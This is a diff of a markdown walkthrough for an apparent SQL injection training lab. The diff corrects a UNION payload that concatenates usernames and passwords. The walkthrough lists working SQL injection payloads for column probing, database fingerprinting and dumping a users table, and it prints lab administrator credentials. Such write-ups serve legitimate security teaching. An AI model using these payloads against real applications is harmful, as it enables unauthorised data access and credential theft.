@@ -18,13 +18,13 @@ To solve the lab, perform a SQL injection UNION attack that retrieves all userna
 * `' UNION SELECT 'test', null-- -`
 * `' UNION SELECT null, 'test'-- -`  
 It looks like `column 2` returns string output!   
-![descript](images/sqli-practitioner-lab8-col.png)
+![descript](images/sqli-practitioner-lab8-col.png)  
 4. I can now check what kind of database I am currently working with by using the following payloads:  
 * `' UNION SELECT null, @@version-- -`
 * `' UNION SELECT null, version()-- -`
 * `' UNION SELECT null, banner FROM v$version`
 It looks like I'm dealing with a `PostgreSQL` DBMS!
-5. Now, I can craft a tailored payload: `' UNION SELECT null, username || ':' password from users-- -`. As you can see, it returned the data within one column:  
+5. Now, I can craft a tailored payload: `' UNION SELECT null, username || ':' || password from users-- -`. As you can see, it returned the data within one column:  
 ![descript](images/sqli-practitioner-lab8-data.png)
 6. I can now use these credentials of `administrator` and `lu2zlt04xidh3uscd9ix` to log in and solve the lab! 
 
